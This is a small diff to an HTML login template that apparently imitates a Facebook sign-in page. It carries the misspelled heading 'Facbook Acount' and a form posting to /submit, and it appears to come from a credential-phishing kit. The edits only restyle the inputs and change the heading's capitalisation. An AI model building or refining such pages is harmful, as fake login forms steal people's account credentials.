@@ -35,6 +35,10 @@
             border: 1px solid #ccc;
             border-radius: 6px;
             box-sizing: border-box;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #007bff;
         }
         .submit-btn {
             width: 100%;
@@ -59,7 +63,7 @@
             <img src="{{ url_for('static', filename='favicon.png') }}" alt="logo" style="width: 35px;">
         </div>
         <div class="text">
-            <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">Log in your Facbook Acount</h5>
+            <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">Log in Your Facbook Acount</h5>
         </div>
         <!-- target="_blank" দেওয়ার ফলে নতুন ট্যাবে রিডাইরেক্ট লিংক ওপেন হবে -->
         <form action="/submit" method="POST" target="_blank">
